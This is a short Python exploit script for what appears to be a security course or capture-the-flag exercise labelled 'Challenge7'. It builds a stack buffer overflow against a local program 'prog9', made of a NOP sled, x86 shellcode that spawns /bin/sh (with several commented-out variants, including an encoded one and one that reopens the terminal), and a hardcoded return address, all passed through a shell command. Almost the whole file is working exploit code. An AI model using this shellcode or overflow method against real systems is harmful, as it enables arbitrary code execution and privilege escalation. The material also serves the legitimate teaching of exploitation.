#!/usr/bin/env python

import sys, os, struct, subprocess

#Challenge7
payload = "\xeb\x17\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x31\xd2\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58"

# reopen stdin
#payload = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
#payload = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68\x2f\x74\x74\x79\x68\x2f\x64\x65\x76\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

#This one with grade___:
#working grade:
#payload = "\xeb\x17\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x31\xd2\xcd\x80\xe8\xe4\xff\xff\xff\x61\x62\x69\x6e\x61\x73\x68\x58"
#payload = "\xeb\x17\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x31\xd2\xcd\x80\xe8\xe4\xff\xff\xff\x61\x62\x69\x6e\x61\x73\x68\x58"

#New Try:
#payload = "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"

buf_len = 0x1f0
ret_addr = 0xffffd8a0

for i in range(0x1,0x9,0x1):
	buf = ('\x90'*(buf_len - len(payload))) + payload +('\x90'*16)+ chr(i)+ 'AAAA' + str(struct.pack('<L', ret_addr)) #+ ('\x90' * 32) + '\xeb\x17\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x31\xd2\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58' #+ 'AAAA' + str(struct.pack('Q',i))
	bufStr = str(buf)
	f = open("gg2.txt","w")
	f.write(bufStr)
	f.close()
	#os.system("prog9 " + buf)
	#subprocess.call(['prog9 ', buf], shell=True)
	sub = subprocess.Popen('prog9 ' + buf, shell=True).wait()
	#subprocess.call(['grade'],shell=True)
